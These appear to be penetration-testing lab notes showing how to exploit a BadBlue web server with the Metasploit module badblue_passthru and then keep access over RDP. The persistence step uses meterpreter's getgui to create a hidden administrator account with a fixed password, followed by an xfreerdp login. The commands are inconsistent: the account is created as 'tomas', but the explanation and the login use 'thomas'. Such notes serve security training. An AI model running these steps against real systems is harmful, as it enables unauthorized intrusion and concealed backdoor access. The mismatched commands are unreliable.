# Persistence Via RDP

## Practice Demo

Identify the vulnerable service.

We identify the BadBlue vulnerability.

We use the module <mark style="color:red;">exploit/windows/http/badblue\_passthru</mark>

We gain a 32 bit meterpreter session on the target, as the Admin user.

We migrate to a more stable service, since what we will be doing requires it, giving us a 64 bit meterpreter session.

### Creating backdoor user account

In meterpreter run:

* <mark style="color:yellow;">run getgui -e -u tomas -p hacker\_123321</mark>
  * "<mark style="color:red;">getgui</mark>": Checks if rdp is enabled or enable it
  * Creates a new user "thomas"
  * Hides user from login screen
  * And add the user to the admins and Remote Desktop Users group

#### To access the target system:

* <mark style="color:yellow;">xfreerdp /u:thomas /p:hacker\_123321  /v:targetIP</mark>
